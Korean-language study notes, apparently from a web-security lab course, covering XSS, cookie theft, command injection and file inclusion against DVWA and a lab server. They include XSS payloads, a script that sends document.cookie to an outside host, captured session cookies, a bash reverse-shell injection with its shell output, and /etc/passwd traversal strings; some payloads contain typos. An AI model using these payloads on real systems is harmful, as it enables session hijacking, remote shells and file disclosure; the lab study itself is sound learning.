![](../Images/dfadsafasdfasdgah.png)> Cross Site Scripting 취약점이 있는 웹사이트에 방문한 사용자의 웹 브라우저에서 악의적인 HTML 태그나 자바스크립트가 동작하는 공격이다. 악의적인 공격자가 작성한 스크립트 코드가 피해자의 시스템에서 실행되는 것.

**공격 목적**
- 쿠키 훔치기
- 악성 코드 주소로 이동
- 페이지 변조
- 피해 브라우저 제어

- [Common Payloads]()


---

## Reflected XSS

```tag
"><marquee>xss</marquee>
```
![](../Images/Pasted%20image%2020260731102012.png)
-  원리
> 경고 알림창을 띄우면 XSS 취약점 존재한다고 판정
```tag
"><script>alert("xss")</script>
<img src=@ onerror-alert("xss");>
<video scr="1" onerror=document.location="http://naver.com">
<iframe scr="https://121.190.160.232:81"> </iframe>
```

- 웹 서버에서 입력 받은 값을 서버에서 파라미터를 그대로 반환하며 발생
- 검색창 & 모든 파라미터를 대상으로 공격 가능
- 테이블의 구문을 파악 후 취약점 스캔

---

## Stored XSS

취약점이 있는 웹 서버에 악성 스크립트를 영구적으로 저장.


---

## 쿠키 탈취 공격

```txt
http://121.190.160.232:81/XSSAttack/attack_cookie.txt

"><script>alert(document.cookie)</script>
// ASPSESSIONIDCSTBCQTA=KACOEGOCFMJGLNBDJLCEKEEP

```
![](../Images/Pasted%20image%2020260731105122.png)

```txt
<script> document.write("<iframe scr=http://121.190.160.232:81/XSSAttack/1.asp?cookie" + document.cookie+" width =0 height =0 > </iframe>")</script>
```

```txt

-- 탈취된 쿠키값.
ASPSESSIONIDCSTBCQTA=GACOEGOCDGLKBECBNFANBGDN
---------------------------------------
ASPSESSIONIDCSTBCQTA=GACOEGOCDGLKBECBNFANBGDN
---------------------------------------
ASPSESSIONIDCSTBCQTA=GACOEGOCDGLKBECBNFANBGDN
---------------------------------------
ASPSESSIONIDCSTBCQTA=GACOEGOCDGLKBECBNFANBGDN
---------------------------------------
ASPSESSIONIDCSTBCQTA=GACOEGOCDGLKBECBNFANBGDN
---------------------------------------
ASPSESSIONIDCSTBCQTA=GACOEGOCDGLKBECBNFANBGDN
---------------------------------------
ASPSESSIONIDCSTBCQTA=GACOEGOCDGLKBECBNFANBGDN
---------------------------------------
ASPSESSIONIDCSTBCQTA=HOONEGOCIKLNFDCEKHCCDNFH
---------------------------------------
ASPSESSIONIDCSTBCQTA=HOONEGOCIKLNFDCEKHCCDNFH
---------------------------------------
ASPSESSIONIDCSTBCQTA=GACOEGOCDGLKBECBNFANBGDN
```

**시나리오**
1. 사용자 게시판 접속
2. 쿠키 탈취되어 개별 txt에 쿠키 저장
3. 웹 서버에 다른 사용자 쿠키 값으로 변경 시 계정 탈취 가능

기존 로그인 정보값
- mmmm > asdqwe(hacker) 값으로 변경
![](../Images/Pasted%20image%2020260731112409.png)



---

## DVWA(XSS)

```php
"><marquee>test</marquee>
```

```php
# Reflected XSS Source

## vulnerabilities/xss_r/source/low.php

|   |
|---|
|`<?php      header ("X-XSS-Protection: 0");  //HTTP XSS 기능 비활성화 명령어 header
    // Is there any input?   if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {    // Feedback for end user    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';   }      ?>   `|

```

**공격 시나리오**
- `$_GET` 이후 아무런 조치 없이 모든 input 값에 대하여 서버에 검증하는 도구도 없기 때문에 위에 기술된 공격 내용이 모두 적용된다.
- Medium 방식도 단순하게 `<script> 문자열을 포함`하는 string 값에 대한 처리만 이루어지기 때문에 이외 모든 공격이 가능하다.
- Impossible 값에도 비슷하게 ` checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );`에 대한 처리가 이루어지지만 사실상 특수문자를 기입하게 되면 그대로 XSS 공격이 가능하기 때문에 좋은 방어책이 아니게 보인다.


---
## Document Object Model

- innetHTML , document.write()
- textContent innerText
>html 코드나 javascript 중 문자열 화면에 출력하는 메서드


OS command injection
사용자 입력값이 어플리케이션의 운영체제 명령어 실행 가능

**리눅스**
; 앞의 명령어가 끝나면 뒤 명령어가 실행되는 특수문자
& 앞의 명령어를 백그라운드로 실행하고 바로 뒤의 명령을 실행
&& 앞 명령어 성공 시 뒤 명령어를 실행
| 앞 명령어 출력을 뒤 명령어 input 값으로 넘김
|| 앞 명령어 실패 시 뒤 명령어를 실행


**윈도우**
& 앞 명령어가 끝나면 뒤 명령어를 실행하는 특수 문자
&& 앞 명령이 성공하면 뒤 명령어 실행
| 앞 명령어 출력을 뒤 명령어 input 값으로 넘김
|| 앞 명령어 실패 시 뒤 명령어를 실행
 


*공격 실행 1.
 - (ip ); /cat/etc/passwd

![](../Images/dfadsafasdfasdgah%201.png)


*공격 실행 2.

kali linux 환경
```bash
ip a
ping 8.8.8.8
nc -lvnp 4444 //Listening 4444 port open

192.168.63.133(kali linux ip)
```

DVWA command injection prompt 입력
```bash
low- 127.0.0.1; bash -i >&/dev/tcp/192.168.63.133/4444 0>&1
medium - 127.0.0.1&;&id bash -i >&/dev/tcp/192.168.63.133/4444 0>&1

```


*KALI LINUX*
```bash
-- kali linux 변환
┌──(root㉿kali)-[~]
└─# nc -lvnp 4444                            
listening on [any] 4444 ...
connect to [192.168.63.133] from (UNKNOWN) [192.168.63.134] 51206
bash: cannot set terminal process group (983): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$ ls          
ls
help
index.php
source
```

>Kali 에서 web shell을 **탈취**한 것을 볼 수 있다.


---


## 자동화 공격

**공격 방안**
-  무차별 대입 공격
- 게시판에 글을 도배
- 메일, sms 등 을 수백 건

```php
<?php  
  
if( isset( $_POST[ 'Login' ] ) && isset ($_POST['username']) && isset ($_POST['password']) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );    // Sanitise username input    $user = $_POST[ 'username' ];    $user = stripslashes( $user );    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    // Sanitise password input    $pass = $_POST[ 'password' ];    $pass = stripslashes( $pass );    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    $pass = md5( $pass );    // Default values    $total_failed_login = 3;    $lockout_time       = 15;    $account_locked     = false;    // Check the database (Check user information)    $data = $db->prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );    $data->bindParam( ':user', $user, PDO::PARAM_STR );    $data->execute();    $row = $data->fetch();    // Check to see if the user has been locked out.    if( ( $data->rowCount() == 1 ) && ( $row[ 'failed_login' ] >= $total_failed_login ) )  {        // User locked out.  Note, using this method would allow for user enumeration!  
        //echo "<pre><br />This account has been locked due to too many incorrect logins.</pre>";  
  
        // Calculate when the user would be allowed to login again        $last_login = strtotime( $row[ 'last_login' ] );        $timeout    = $last_login + ($lockout_time * 60);        $timenow    = time();        /*  
        print "The last login was: " . date ("h:i:s", $last_login) . "<br />";  
        print "The timenow is: " . date ("h:i:s", $timenow) . "<br />";  
        print "The timeout is: " . date ("h:i:s", $timeout) . "<br />";  
        */  
  
        // Check to see if enough time has passed, if it hasn't locked the account        if( $timenow < $timeout ) {            $account_locked = true;            // print "The account is locked<br />";        }  
    }    // Check the database (if username matches the password)    $data = $db->prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );    $data->bindParam( ':user', $user, PDO::PARAM_STR);    $data->bindParam( ':password', $pass, PDO::PARAM_STR );    $data->execute();    $row = $data->fetch();    // If its a valid login...    if( ( $data->rowCount() == 1 ) && ( $account_locked == false ) ) {        // Get users details        $avatar       = $row[ 'avatar' ];        $failed_login = $row[ 'failed_login' ];        $last_login   = $row[ 'last_login' ];        // Login successful        echo "<p>Welcome to the password protected area <em>{$user}</em></p>";  
        echo "<img src=\"{$avatar}\" />";        // Had the account been locked out since last login?        if( $failed_login >= $total_failed_login ) {  
            echo "<p><em>Warning</em>: Someone might of been brute forcing your account.</p>";  
            echo "<p>Number of login attempts: <em>{$failed_login}</em>.<br />Last login attempt was at: <em>{$last_login}</em>.</p>";  
        }        // Reset bad login count        $data = $db->prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );        $data->bindParam( ':user', $user, PDO::PARAM_STR );        $data->execute();  
    } else {        // Login failed        sleep( rand( 2, 4 ) );        // Give the user some feedback        echo "<pre><br />Username and/or password incorrect.<br /><br/>Alternative, the account has been locked because of too many failed logins.<br />If this is the case, <em>please try again in {$lockout_time} minutes</em>.</pre>";        // Update bad login count        $data = $db->prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );        $data->bindParam( ':user', $user, PDO::PARAM_STR );        $data->execute();  
    }    // Set the last login time    $data = $db->prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );    $data->bindParam( ':user', $user, PDO::PARAM_STR );    $data->execute();  
}  
  
// Generate Anti-CSRF token  
generateSessionToken();  
  
?>

```

- Sanitise password input
	- 사용자가 입력한 데이터나 외부 데이터에 해로운 문자나 악성코드(XSS 공격) 등 <script></script>를 걸러내거나 안전한 형태로 바꾸는 과정 및 라이브러리를 말한다.
- Reset bad login count
	- 지속적인 무차별 대입을 시도하면 sleep(rand(2,4))초 코드를 이용하여 로그인을 무차별적으로 대입하는 것을 방지



---


## File Inclusion

웹 어플리케이션에 파일을 불러들이는 기능이 존재할때 서버 내부의 임의의 파일을 불러올 수 있으면 *LFI 취약점*이 있다. 서버 외부의 파일을 불러올 수 있으면 *RFI 취약점*이 있다. 특정 Window 혹은 Linux에 대한 공격을 대상으로 하고 있다.


=file1.php
```php 
-- 기본 구조
../
..\
.././../

--Low 
../../../../../../../etc/passwd

--Medium ..././..././..././..././..././..././..././etc/passwd
ㄴsolve (str.replace()함수 우회)

--High


=https:/txt


-- Source Code
<?php  
  
// The page we wish to display  
$file = $_GET[ 'page' ];  
  
?>
```
- path traversal
	- 경로 조작/변경
- 페이지 파라미터에 관한 어떤 검증 내용도 없다.
- 공격 타입은 `../../../` , `./././`
- 공격 위치 `../etc/passwd`, `../etc/hosts`, `/var/log/apache2/access.log`, `/var/log/httpd/access_log`
- 로컬 파일 접근 시 파일 이름을 파라미터로 접근할 때 접속하고자 하는 설정에 접근할 수 있다.

![](../Images/Pasted%20image%2020260803094533.png)